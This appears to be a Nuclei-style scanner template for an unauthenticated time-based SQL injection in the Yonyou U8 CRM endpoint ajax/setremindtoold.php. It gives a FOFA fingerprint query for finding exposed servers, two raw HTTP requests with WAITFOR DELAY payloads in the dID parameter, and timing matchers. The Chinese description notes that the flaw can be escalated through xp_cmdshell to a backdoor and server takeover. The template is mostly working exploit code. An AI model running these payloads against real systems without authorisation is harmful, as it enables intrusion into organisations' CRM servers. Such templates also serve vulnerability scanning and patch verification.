id: yongyouU8-CRM-setremindtoold_php-sql

info:
  name: 用友U8 CRM ajax/setremindtoold.php SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="用友U8CRM"
    用友 U8 CRM客户关系管理系统 ajax/setremindtoold.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487793&idx=1&sn=141b5588d24c6cc8f8494dbab8f63011&chksm=c267a402f5102d144df89cd2d2b3988f11545534b0256d8dbc23ff64380994d4bb259b7b0e14&token=65579130&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Cookie: PHPSESSID=bgsesstimeout-;

      - |
        GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Cookie: PHPSESSID=bgsesstimeout-;

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



